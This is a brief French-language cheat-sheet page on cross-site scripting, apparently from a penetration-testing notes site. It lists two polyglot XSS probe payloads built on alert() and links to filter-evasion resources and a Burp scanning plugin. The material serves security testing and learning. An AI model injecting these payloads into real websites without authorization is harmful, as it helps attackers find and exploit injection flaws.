---
title: Cross Site Scripting
permalink: /XSS/
---

# Cross-Site Scripting

## Tips & tricks

### Payloads

Les payloads suivants peuvent être utiles:

``` text
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

```text
" onclick=alert(1)//<button ' onclick=alert(1)//>*/alert(1)//
```

## Références

- [Master the art of Cross Site Scripting](https://brutelogic.com.br/blog/)
- [XSS without event handlers](https://brutelogic.com.br/blog/xss-without-event-handlers/): pour les situations où les events du type onerror sont bloqués
- [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- [PassiveXssScan](https://github.com/jkadijk/burp-plugins): un plugin pour identifier automatiquement les éléments "reflected" dans Burp.
